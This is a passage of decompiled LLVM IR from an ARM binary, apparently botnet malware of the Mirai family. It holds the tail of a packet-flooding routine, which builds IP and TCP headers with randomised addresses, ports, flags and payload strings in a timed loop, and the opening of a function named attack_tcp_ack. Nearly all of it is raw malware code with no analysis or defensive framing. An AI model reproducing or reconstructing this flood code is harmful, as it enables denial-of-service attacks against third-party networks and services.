  br label %dec_label_pc_b7a8

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b598
  %v0_b8c4 = load i32, i32* @sl, align 4
  store i32 %v0_b8c4, i32* %r0.global-to-local, align 4
  %v1_b8c8 = call i32 @__GI___libc_close(i32 %v0_b8c4)
  store i32 %v1_b8c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b8cc

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b94c, %entry, %dec_label_pc_b8c4
  %v1_b8d4 = phi i32 [ %v3_b588, %entry ], [ %v1_b8c8, %dec_label_pc_b8c4 ], [ %v2_b950, %dec_label_pc_b94c ], [ 0, %dec_label_pc_b6a4 ]
  store i32 %v3_b394, i32* %r4.global-to-local, align 4
  store i32 %v27_b394, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8d4

dec_label_pc_b8d8:                                ; preds = %bb72
  %v1_b8d8 = add i32 %v4_b63c, 16
  %v2_b8d8 = inttoptr i32 %v1_b8d8 to i32*
  %v3_b8d8 = load i32, i32* %v2_b8d8, align 4
  store i32 %v3_b8d8, i32* @r4, align 4
  %v0_b8dc = call i32 @rand_next()
  store i32 %v0_b8dc, i32* %r0.global-to-local, align 4
  %v3_b8e0 = load i32, i32* %stack_var_-44, align 4
  %v5_b8e8 = mul i32 %v3_b8e0, 24
  %v0_b8ec = load i32, i32* @r4, align 4
  %v1_b8ec = and i32 %v0_b8ec, 16711680
  store i32 %v1_b8ec, i32* %ip.global-to-local, align 4
  %v3_b8f0 = udiv i32 %v0_b8ec, 16777216
  %v4_b8f4 = udiv i32 %v1_b8ec, 256
  %v5_b8f4 = or i32 %v4_b8f4, %v3_b8f0
  store i32 %v5_b8f4, i32* %r2.global-to-local, align 4
  %v1_b8f8 = load i32, i32* @fp, align 4
  %v2_b8f8 = add i32 %v1_b8f8, %v5_b8e8
  store i32 %v2_b8f8, i32* %r1.global-to-local, align 4
  %v1_b8fc = and i32 %v0_b8ec, 65280
  store i32 %v1_b8fc, i32* %r3.global-to-local, align 4
  %v1_b900 = add i32 %v2_b8f8, 20
  %v2_b900 = inttoptr i32 %v1_b900 to i8*
  %v3_b900 = load i8, i8* %v2_b900, align 1
  %v4_b900 = zext i8 %v3_b900 to i32
  store i32 %v4_b900, i32* %ip.global-to-local, align 4
  %v5_b908 = call i32 @llvm.bswap.i32(i32 %v0_b8ec)
  %v7_b90c = lshr i32 %v0_b8dc, %v4_b900
  %v8_b90c = add i32 %v7_b90c, %v5_b908
  store i32 %v8_b90c, i32* %r2.global-to-local, align 4
  %v1_b910 = and i32 %v8_b90c, 16711680
  store i32 %v1_b910, i32* %r0.global-to-local, align 4
  %v1_b91c = and i32 %v8_b90c, 65280
  store i32 %v1_b91c, i32* %r1.global-to-local, align 4
  %v5_b924 = call i32 @llvm.bswap.i32(i32 %v8_b90c)
  store i32 %v5_b924, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b644

dec_label_pc_b930:                                ; preds = %dec_label_pc_b644
  %v0_b930 = call i32 @rand_next()
  %v1_b930 = trunc i32 %v0_b930 to i16
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  store i32 %v2_b620, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b668

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b768
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b950 = call i32 @__GI_time(i32* null)
  store i32 %v2_b950, i32* %r0.global-to-local, align 4
  store i32 %v2_b574, i32* %r2.global-to-local, align 4
  %v6_b95c = icmp slt i32 %v2_b574, %v2_b950
  br i1 %v6_b95c, label %dec_label_pc_b8cc, label %dec_label_pc_b768

dec_label_pc_b964:                                ; preds = %dec_label_pc_b714
  %v3_b964 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b964, i32* @r5, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r0.global-to-local, align 4
  %v5_b970 = mul i32 %v3_b964, 16
  %v6_b970 = add i32 %v5_b970, %v2_b3c0
  %v7_b970 = inttoptr i32 %v6_b970 to i32*
  store i32 %v0_b970, i32* %v7_b970, align 4
  %v0_b974 = load i32, i32* %r0.global-to-local, align 4
  %v1_b974 = add i32 %v0_b974, 4
  %v2_b974 = inttoptr i32 %v1_b974 to i32*
  %v3_b974 = load i32, i32* %v2_b974, align 4
  %v1_b978 = and i32 %v3_b974, 16711680
  store i32 %v1_b978, i32* %r0.global-to-local, align 4
  %v5_b98c = call i32 @llvm.bswap.i32(i32 %v3_b974)
  store i32 %v5_b98c, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r1.global-to-local, align 4
  %v0_b994 = load i32, i32* @r5, align 4
  %v3_b994 = mul i32 %v0_b994, 16
  %v2_b998 = add i32 %v3_b994, %v2_b3c0
  store i32 %v2_b998, i32* %ip.global-to-local, align 4
  %v2_b99c = add i32 %v2_b998, 4
  %v3_b99c = inttoptr i32 %v2_b99c to i32*
  store i32 %v5_b98c, i32* %v3_b99c, align 4
  store i32 %stack_var_-340.0.ph, i32* %r2.global-to-local, align 4
  %v1_b9a4 = add i32 %stack_var_-340.0.ph, 8
  %v2_b9a4 = inttoptr i32 %v1_b9a4 to i32*
  %v3_b9a4 = load i32, i32* %v2_b9a4, align 4
  %v1_b9b0 = and i32 %v3_b9a4, 65280
  store i32 %v1_b9b0, i32* %r2.global-to-local, align 4
  %v5_b9bc = call i32 @llvm.bswap.i32(i32 %v3_b9a4)
  store i32 %v5_b9bc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v6_b544, i32* %r0.global-to-local, align 4
  %v1_b9c8 = add i32 %stack_var_-340.0.ph, 2
  %v2_b9c8 = inttoptr i32 %v1_b9c8 to i16*
  %v3_b9c8 = load i16, i16* %v2_b9c8, align 2
  %v4_b9c8 = zext i16 %v3_b9c8 to i32
  store i32 %v4_b9c8, i32* %r1.global-to-local, align 4
  store i32 %v1_b9cc, i32* @r4, align 4
  %v2_b9d0 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d0 = add i32 %v2_b9d0, 12
  %v4_b9d0 = inttoptr i32 %v3_b9d0 to i16*
  store i16 %v3_b9c8, i16* %v4_b9d0, align 2
  %v0_b9d4 = load i32, i32* @lr, align 4
  %v1_b9d4 = trunc i32 %v0_b9d4 to i16
  %v2_b9d4 = load i32, i32* %ip.global-to-local, align 4
  %v3_b9d4 = add i32 %v2_b9d4, 14
  %v4_b9d4 = inttoptr i32 %v3_b9d4 to i16*
  store i16 %v1_b9d4, i16* %v4_b9d4, align 2
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b9d8 = add i32 %v1_b9d8, 8
  %v3_b9d8 = inttoptr i32 %v2_b9d8 to i32*
  store i32 %v0_b9d8, i32* %v3_b9d8, align 4
  %v0_b9dc = load i32, i32* @r4, align 4
  store i32 %v0_b9dc, i32* @r0, align 4
  %v0_b9e0 = call i32 @malloc()
  store i32 %v0_b9e0, i32* %r0.global-to-local, align 4
  store i32 %v2_b3d0, i32* %r3.global-to-local, align 4
  %v2_b9ec = load i32, i32* @r5, align 4
  %v5_b9ec = mul i32 %v2_b9ec, 4
  %v6_b9ec = add i32 %v5_b9ec, %v2_b3d0
  %v7_b9ec = inttoptr i32 %v6_b9ec to i32*
  store i32 %v0_b9e0, i32* %v7_b9ec, align 4
  %v3_b9f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b9f0, i32* %r2.global-to-local, align 4
  %v0_b9f4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b9f4 = mul i32 %v3_b9f0, 4
  %v5_b9f4 = add i32 %v0_b9f4, %v4_b9f4
  %v6_b9f4 = inttoptr i32 %v5_b9f4 to i32*
  %v7_b9f4 = load i32, i32* %v6_b9f4, align 4
  store i32 %v7_b9f4, i32* %ip.global-to-local, align 4
  %v1_b9f8 = inttoptr i32 %v7_b9f4 to i8*
  %v2_b9f8 = load i8, i8* %v1_b9f8, align 1
  %tmp102 = urem i8 %v2_b9f8, 16
  %v1_b9fc = zext i8 %tmp102 to i32
  %v1_ba00 = or i32 %v1_b9fc, 64
  store i32 %v1_ba00, i32* %r3.global-to-local, align 4
  %v1_ba04 = trunc i32 %v1_ba00 to i8
  store i8 %v1_ba04, i8* %v1_b9f8, align 1
  %v0_ba08 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba08 = inttoptr i32 %v0_ba08 to i8*
  %v2_ba08 = load i8, i8* %v1_ba08, align 1
  store i32 %v4_ba0c, i32* %lr.global-to-local, align 4
  %v1_ba10 = and i8 %v2_ba08, -16
  %v1_ba1c = or i8 %v1_ba10, 5
  %v0_ba20 = load i32, i32* @r4, align 4
  %v3_ba20 = mul i32 %v0_ba20, 65536
  store i32 %v3_ba20, i32* %r4.global-to-local, align 4
  store i32 %v5_ba24, i32* %r1.global-to-local, align 4
  store i32 %v1_b450, i32* %r0.global-to-local, align 4
  store i8 %v1_ba1c, i8* %v1_ba08, align 1
  %v0_ba30 = load i32, i32* %r1.global-to-local, align 4
  %v1_ba30 = trunc i32 %v0_ba30 to i16
  %v2_ba30 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba30 = add i32 %v2_ba30, 4
  %v4_ba30 = inttoptr i32 %v3_ba30 to i16*
  store i16 %v1_ba30, i16* %v4_ba30, align 2
  %v0_ba34 = load i32, i32* %r4.global-to-local, align 4
  %v3_ba34 = udiv i32 %v0_ba34, 256
  %v1_ba3c = and i32 %v3_ba34, 65280
  store i32 %v1_ba3c, i32* %r2.global-to-local, align 4
  %v2_ba40 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba40 = add i32 %v2_ba40, 1
  %v4_ba40 = inttoptr i32 %v3_ba40 to i8*
  store i8 %v5_b408, i8* %v4_ba40, align 1
  %v0_ba44 = load i32, i32* %r2.global-to-local, align 4
  %v1_ba44 = load i32, i32* %r4.global-to-local, align 4
  %v4_ba44 = udiv i32 %v1_ba44, 16777216
  %v5_ba44 = or i32 %v4_ba44, %v0_ba44
  %v1_ba48 = trunc i32 %v5_ba44 to i16
  %v2_ba48 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba48 = add i32 %v2_ba48, 2
  %v4_ba48 = inttoptr i32 %v3_ba48 to i16*
  store i16 %v1_ba48, i16* %v4_ba48, align 2
  %v0_ba50 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba50 = add i32 %v0_ba50, 20
  store i32 %v1_ba50, i32* %r3.global-to-local, align 4
  %v3_ba54 = add i32 %v0_ba50, 8
  %v4_ba54 = inttoptr i32 %v3_ba54 to i8*
  store i8 %v5_b440, i8* %v4_ba54, align 1
  %v0_ba58 = load i32, i32* %r3.global-to-local, align 4
  %v2_ba60 = load i32, i32* %ip.global-to-local, align 4
  %v3_ba60 = add i32 %v2_ba60, 9
  %v4_ba60 = inttoptr i32 %v3_ba60 to i8*
  store i8 6, i8* %v4_ba60, align 1
  store i32 ptrtoint (i32* @global_var_271b8.90 to i32), i32* %r2.global-to-local, align 4
  %v2_ba68 = load i32, i32* @global_var_271b8.90, align 4
  store i32 %v2_ba68, i32* %r1.global-to-local, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, 12
  %v3_ba6c = inttoptr i32 %v2_ba6c to i32*
  store i32 %v2_ba68, i32* %v3_ba6c, align 4
  %v0_ba70 = load i32, i32* %r0.global-to-local, align 4
  %v2_ba70 = icmp eq i32 %v0_ba70, 0
  %v3_ba74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba74, i32* %r3.global-to-local, align 4
  store i32 %v2_b3c0, i32* %r0.global-to-local, align 4
  br i1 %v2_ba70, label %.thread10, label %bb83

bb83:                                             ; preds = %dec_label_pc_b964
  store i32 64, i32* %lr.global-to-local, align 4
  %v3_ba80 = load i32, i32* %ip.global-to-local, align 4
  %v4_ba80 = add i32 %v3_ba80, 6
  %v5_ba80 = inttoptr i32 %v4_ba80 to i16*
  store i16 64, i16* %v5_ba80, align 2
  %v0_ba84.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_ba84.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_b964, %bb83
  %v0_ba88 = phi i32 [ %v3_ba74, %dec_label_pc_b964 ], [ %v1_ba84.pre, %bb83 ]
  %v1_ba8c = phi i32 [ %v2_b3c0, %dec_label_pc_b964 ], [ %v0_ba84.pre, %bb83 ]
  %v4_ba84 = mul i32 %v0_ba88, 16
  %v5_ba84 = add i32 %v4_ba84, %v1_ba8c
  %v6_ba84 = inttoptr i32 %v5_ba84 to i32*
  %v7_ba84 = load i32, i32* %v6_ba84, align 4
  store i32 %v7_ba84, i32* %r2.global-to-local, align 4
  store i32 %v5_ba84, i32* %r3.global-to-local, align 4
  %v1_ba90 = load i32, i32* %ip.global-to-local, align 4
  %v2_ba90 = add i32 %v1_ba90, 16
  %v3_ba90 = inttoptr i32 %v2_ba90 to i32*
  store i32 %v7_ba84, i32* %v3_ba90, align 4
  %v0_ba94 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba94 = add i32 %v0_ba94, 12
  %v2_ba94 = inttoptr i32 %v1_ba94 to i16*
  %v3_ba94 = load i16, i16* %v2_ba94, align 2
  %v4_ba94 = zext i16 %v3_ba94 to i32
  store i32 %v4_ba94, i32* %r1.global-to-local, align 4
  %v0_ba98 = load i32, i32* %ip.global-to-local, align 4
  %v1_ba98 = add i32 %v0_ba98, 40
  store i32 %v1_ba98, i32* @r4, align 4
  %v3_ba9c = add i32 %v0_ba98, 20
  %v4_ba9c = inttoptr i32 %v3_ba9c to i16*
  store i16 %v3_ba94, i16* %v4_ba9c, align 2
  store i32 %v0_ba58, i32* %ip.global-to-local, align 4
  %v0_baa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_baa4 = add i32 %v0_baa4, 8
  %v2_baa4 = inttoptr i32 %v1_baa4 to i32*
  %v3_baa4 = load i32, i32* %v2_baa4, align 4
  store i32 %v3_baa4, i32* %r1.global-to-local, align 4
  %v2_baa8 = add i32 %v0_ba58, 4
  %v3_baa8 = inttoptr i32 %v2_baa8 to i32*
  store i32 %v3_baa4, i32* %v3_baa8, align 4
  %v0_baac = load i32, i32* %ip.global-to-local, align 4
  %v1_baac = add i32 %v0_baac, 13
  %v2_baac = inttoptr i32 %v1_baac to i8*
  %v3_baac = load i8, i8* %v2_baac, align 1
  %v4_baac = zext i8 %v3_baac to i32
  store i32 %v4_baac, i32* %r2.global-to-local, align 4
  %v0_bab0 = load i32, i32* %r3.global-to-local, align 4
  %v1_bab0 = add i32 %v0_bab0, 4
  %v2_bab0 = inttoptr i32 %v1_bab0 to i32*
  %v3_bab0 = load i32, i32* %v2_bab0, align 4
  store i32 %v3_bab0, i32* %r1.global-to-local, align 4
  %v1_bab4 = add i32 %v0_bab0, 14
  %v2_bab4 = inttoptr i32 %v1_bab4 to i16*
  %v3_bab4 = load i16, i16* %v2_bab4, align 2
  %v4_bab4 = zext i16 %v3_bab4 to i32
  store i32 %v4_bab4, i32* %r3.global-to-local, align 4
  %v1_bab8 = or i32 %v4_baac, 1
  store i32 %v1_bab8, i32* %r2.global-to-local, align 4
  %v3_babc = add i32 %v0_baac, 2
  %v4_babc = inttoptr i32 %v3_babc to i16*
  store i16 %v3_bab4, i16* %v4_babc, align 2
  %v0_bac0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bac0 = trunc i32 %v0_bac0 to i8
  %v2_bac0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bac0 = add i32 %v2_bac0, 13
  %v4_bac0 = inttoptr i32 %v3_bac0 to i8*
  store i8 %v1_bac0, i8* %v4_bac0, align 1
  %v0_bac4 = load i32, i32* %ip.global-to-local, align 4
  %v1_bac4 = add i32 %v0_bac4, 12
  %v2_bac4 = inttoptr i32 %v1_bac4 to i8*
  %v3_bac4 = load i8, i8* %v2_bac4, align 1
  %v4_bac4 = zext i8 %v3_bac4 to i32
  store i32 %v4_bac4, i32* %r3.global-to-local, align 4
  %v1_bac8 = add i32 %v0_bac4, 13
  %v2_bac8 = inttoptr i32 %v1_bac8 to i8*
  %v3_bac8 = load i8, i8* %v2_bac8, align 1
  %v4_bac8 = zext i8 %v3_bac8 to i32
  %tmp103 = urem i8 %v3_bac4, 16
  %v1_bacc = zext i8 %tmp103 to i32
  %v1_bad0 = or i32 %v1_bacc, 128
  store i32 %v1_bad0, i32* %r3.global-to-local, align 4
  %v1_bad4 = or i32 %v4_bac8, 16
  store i32 %v1_bad4, i32* %r2.global-to-local, align 4
  %v0_bad8 = load i32, i32* %r1.global-to-local, align 4
  %v2_bad8 = add i32 %v0_bac4, 8
  %v3_bad8 = inttoptr i32 %v2_bad8 to i32*
  store i32 %v0_bad8, i32* %v3_bad8, align 4
  %v0_badc = load i32, i32* %r3.global-to-local, align 4
  %v1_badc = trunc i32 %v0_badc to i8
  %v2_badc = load i32, i32* %ip.global-to-local, align 4
  %v3_badc = add i32 %v2_badc, 12
  %v4_badc = inttoptr i32 %v3_badc to i8*
  store i8 %v1_badc, i8* %v4_badc, align 1
  %v0_bae0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bae0 = trunc i32 %v0_bae0 to i8
  %v2_bae0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bae0 = add i32 %v2_bae0, 13
  %v4_bae0 = inttoptr i32 %v3_bae0 to i8*
  store i8 %v1_bae0, i8* %v4_bae0, align 1
  %v0_bae4 = call i32 @rand_next()
  %v1_bae4 = trunc i32 %v0_bae4 to i16
  store i32 %v0_bae4, i32* %r0.global-to-local, align 4
  store i32 %v0_ba58, i32* %lr.global-to-local, align 4
  store i32 %v1_b48c, i32* %r1.global-to-local, align 4
  %v1_baf0 = add i32 %v0_ba58, 13
  %v2_baf0 = inttoptr i32 %v1_baf0 to i8*
  %v3_baf0 = load i8, i8* %v2_baf0, align 1
  %v4_baf0 = zext i8 %v3_baf0 to i32
  store i32 %v1_baf4, i32* %r2.global-to-local, align 4
  %v1_baf8 = and i32 %v4_baf0, 223
  %v5_bafc = or i32 %v1_baf8, %v4_bafc
  store i32 %v5_bafc, i32* %r3.global-to-local, align 4
  %v1_bb00 = trunc i32 %v5_bafc to i8
  store i8 %v1_bb00, i8* %v2_baf0, align 1
  store i32 %v1_b4ac, i32* %ip.global-to-local, align 4
  %v0_bb08 = load i32, i32* %lr.global-to-local, align 4
  %v1_bb08 = add i32 %v0_bb08, 13
  %v2_bb08 = inttoptr i32 %v1_bb08 to i8*
  %v3_bb08 = load i8, i8* %v2_bb08, align 1
  %v4_bb08 = zext i8 %v3_bb08 to i32
  store i32 %v1_bb0c, i32* %r3.global-to-local, align 4
  %v1_bb10 = and i32 %v4_bb08, 239
  %v5_bb14 = or i32 %v1_bb10, %v4_bb14
  store i32 %v5_bb14, i32* %r2.global-to-local, align 4
  %v1_bb18 = trunc i32 %v5_bb14 to i8
  store i8 %v1_bb18, i8* %v2_bb08, align 1
  %v0_bb1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bb1c = add i32 %v0_bb1c, 13
  %v2_bb1c = inttoptr i32 %v1_bb1c to i8*
  %v3_bb1c = load i8, i8* %v2_bb1c, align 1
  %v4_bb1c = zext i8 %v3_bb1c to i32
  store i32 %v1_b4cc, i32* %lr.global-to-local, align 4
  store i32 %v0_ba58, i32* %r1.global-to-local, align 4
  store i32 %v1_bb28, i32* %r2.global-to-local, align 4
  %v1_bb2c = and i32 %v4_bb1c, 247
  %v5_bb30 = or i32 %v1_bb2c, %v4_bb30
  store i32 %v5_bb30, i32* %r3.global-to-local, align 4
  %v1_bb34 = trunc i32 %v5_bb30 to i8
  store i8 %v1_bb34, i8* %v2_baf0, align 1
  store i32 %v1_b4ec, i32* %ip.global-to-local, align 4
  %v0_bb3c = load i32, i32* %r1.global-to-local, align 4
  %v1_bb3c = add i32 %v0_bb3c, 13
  %v2_bb3c = inttoptr i32 %v1_bb3c to i8*
  %v3_bb3c = load i8, i8* %v2_bb3c, align 1
  %v4_bb3c = zext i8 %v3_bb3c to i32
  store i32 %v1_bb40, i32* %r3.global-to-local, align 4
  %v1_bb44 = and i32 %v4_bb3c, 251
  %v5_bb48 = or i32 %v1_bb44, %v4_bb48
  store i32 %v5_bb48, i32* %r2.global-to-local, align 4
  %v1_bb4c = trunc i32 %v5_bb48 to i8
  store i8 %v1_bb4c, i8* %v2_bb3c, align 1
  store i32 %v1_b50c, i32* @lr, align 4
  %v0_bb54 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb54 = add i32 %v0_bb54, 13
  %v2_bb54 = inttoptr i32 %v1_bb54 to i8*
  %v3_bb54 = load i8, i8* %v2_bb54, align 1
  %v4_bb54 = zext i8 %v3_bb54 to i32
  store i32 %v1_bb58, i32* %r2.global-to-local, align 4
  %v1_bb5c = and i32 %v4_bb54, 253
  %v4_bb60 = or i32 %v1_bb5c, %v3_bb60
  store i32 %v4_bb60, i32* %r3.global-to-local, align 4
  %v1_bb64 = trunc i32 %v4_bb60 to i8
  store i8 %v1_bb64, i8* %v2_bb54, align 1
  %v0_bb68 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb68 = add i32 %v0_bb68, 13
  %v2_bb68 = inttoptr i32 %v1_bb68 to i8*
  %v3_bb68 = load i8, i8* %v2_bb68, align 1
  %v4_bb68 = zext i8 %v3_bb68 to i32
  %v1_bb70 = and i32 %v4_bb68, 254
  %v2_bb78 = or i32 %v1_bb70, %v1_bb74
  store i32 %v2_bb78, i32* %r3.global-to-local, align 4
  store i32 %v0_ba58, i32* %r2.global-to-local, align 4
  %v1_bb80 = trunc i32 %v2_bb78 to i8
  store i8 %v1_bb80, i8* %v2_baf0, align 1
  %v3_bb84 = load i32, i32* %r2.global-to-local, align 4
  %v4_bb84 = add i32 %v3_bb84, 14
  %v5_bb84 = inttoptr i32 %v4_bb84 to i16*
  store i16 %v1_bae4, i16* %v5_bb84, align 2
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  %v2_bb90 = call i32 @rand_alphastr(i32 %v0_bb8c, i32 %v6_b544)
  store i32 %v2_bb90, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  %v2_bb9c = load i32, i32* @r4, align 4
  %v4_bb9c = add i32 %v2_bb9c, %v6_b544
  %v5_bb9c = inttoptr i32 %v4_bb9c to i8*
  store i8 0, i8* %v5_bb9c, align 1
  %v3_bba0 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_bba8 = add i32 %v3_bba0, 1
  store i32 %v1_bba8, i32* @r3, align 4
  store i32 %v1_bba8, i32* %stack_var_-44, align 4
  %v5_bbb4 = icmp slt i32 %v1_bba8, %arg2
  br i1 %v5_bbb4, label %dec_label_pc_b5dc.outer, label %dec_label_pc_b768.preheader

; uselistorder directives
  uselistorder i32 %v1_bba8, { 1, 0, 2 }
  uselistorder i8* %v2_baf0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_bae4, { 1, 0 }
  uselistorder i32 %v0_ba58, { 1, 2, 4, 3, 6, 5, 0 }
  uselistorder i32 %v5_b98c, { 1, 0 }
  uselistorder i32 %v2_b950, { 1, 2, 0 }
  uselistorder i32 %v0_b930, { 1, 0 }
  uselistorder i32 %v0_b8ec, { 1, 2, 0, 3 }
  uselistorder i32 %v7_b880, { 0, 2, 3, 1 }
  uselistorder i32 %v1_b868, { 1, 2, 0, 3 }
  uselistorder i32 %v5_b830, { 1, 0 }
  uselistorder i32 %v4_b820, { 1, 0 }
  uselistorder i32 %v3_b7ec, { 1, 0 }
  uselistorder i32 %v3_b7cc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b7b8, { 1, 0 }
  uselistorder i32 %v3_b790, { 1, 0 }
  uselistorder i32 %v1_b784, { 2, 0, 1 }
  uselistorder i32 %v1_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b740, { 0, 2, 3, 1 }
  uselistorder i32 %v4_b708, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 3, 1, 2 }
  uselistorder i32 %v0_b64c, { 1, 0, 2 }
  uselistorder i32 %v0_b970, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %v4_b63c, { 1, 0 }
  uselistorder i1 %v7_b634, { 1, 0 }
  uselistorder i32 %v3_b5e8, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %stack_var_-340.0.ph, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v1_bb58, { 1, 0 }
  uselistorder i32 %v1_bb40, { 1, 0 }
  uselistorder i32 %v1_bb0c, { 1, 0 }
  uselistorder i32 %v3_b700, { 1, 0 }
  uselistorder i32 %v1_bb28, { 1, 0 }
  uselistorder i32 %v1_baf4, { 1, 0 }
  uselistorder i32 %v4_ba0c, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v1_b9cc, { 2, 0, 1 }
  uselistorder i32 %v1_b718, { 1, 0 }
  uselistorder i32 %v4_b714, { 2, 0, 1 }
  uselistorder i32 %v2_b620, { 3, 2, 1, 4, 0 }
  uselistorder i16 %v5_b5d4, { 1, 0 }
  uselistorder i32 %v0_b5c4, { 1, 0 }
  uselistorder i32 %v3_b588, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_b574, { 1, 0 }
  uselistorder i32 %v1_b564, { 2, 1, 0 }
  uselistorder i32 %v6_b544, { 2, 7, 6, 5, 8, 3, 12, 11, 10, 13, 4, 0, 9, 1 }
  uselistorder i32 %v1_b50c, { 1, 0 }
  uselistorder i32 %v1_b4ec, { 1, 0 }
  uselistorder i32 %v1_b4cc, { 1, 0 }
  uselistorder i32 %v1_b4ac, { 1, 0 }
  uselistorder i32 %v1_b48c, { 1, 0 }
  uselistorder i32 %v6_b468, { 1, 0 }
  uselistorder i32 %v1_b450, { 1, 0 }
  uselistorder i32 %v5_b424, { 1, 0 }
  uselistorder i32 %v6_b3e8, { 1, 0 }
  uselistorder i32 %v2_b3d0, { 0, 2, 1, 3 }
  uselistorder i32 %v2_b3c0, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 39, 40, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 25, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 7, 3, 4, 5, 6, 12, 8, 9, 10, 11, 14, 13, 16, 15, 17, 19, 18, 22, 20, 26, 21, 23, 25, 24, 29, 27, 28, 30, 31, 32, 34, 35, 33, 36, 38, 37, 40, 39, 43, 42, 41, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 6, 7, 5, 4, 0, 8, 10, 9, 11, 12, 13 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_b8cc, { 1, 3, 0, 2 }
  uselistorder label %dec_label_pc_b898, { 1, 0 }
  uselistorder label %dec_label_pc_b7a8, { 1, 0 }
  uselistorder label %dec_label_pc_b768, { 1, 0 }
  uselistorder label %dec_label_pc_b694, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b668, { 1, 0 }
  uselistorder label %dec_label_pc_b644, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc.outer, { 1, 0 }
}

define i32 @attack_tcp_ack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
